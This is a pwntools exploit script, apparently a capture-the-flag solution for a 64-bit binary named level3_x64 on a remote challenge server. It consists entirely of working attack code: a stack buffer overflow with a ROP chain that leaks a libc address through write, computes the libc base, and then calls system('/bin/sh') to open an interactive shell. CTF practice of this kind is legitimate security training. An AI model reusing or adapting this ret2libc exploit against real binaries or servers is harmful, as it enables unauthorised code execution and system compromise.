from pwn import *
#p=process('./level3_x64')
p=remote('pwn2.jarvisoj.com',9883)
#gdb.attach(p)
e=ELF('./level3_x64')
libc=ELF('libc-2.19.so')
pop_rdi_ret=0x4006b3
pop_rsi_r15_ret=0x4006b1
libc_start_main_got=e.got['__libc_start_main']
write_plt=e.plt['write']
vul_addr=e.symbols['vulnerable_function']
payload1='a'*(0x80+0x8)+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(libc_start_main_got)+p64(0)+p64(write_plt)+p64(vul_addr)
p.sendlineafter("Input:\n",payload1)
temp=p.recv(8)
libc_start_main_addr=u64(temp[0:8])
#print (libc_start_main_addr)
libcbase=libc_start_main_addr-libc.symbols['__libc_start_main']
sys_addr=libcbase+libc.symbols['system']
bin_sh_addr=libcbase+libc.search('/bin/sh').next()
#print (sys_addr)
#print (bin_sh_addr)
payload2='a'*(0x80+0x8)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(sys_addr)+'aaaa'
p.sendlineafter("Input:\n",payload2)
p.interactive()
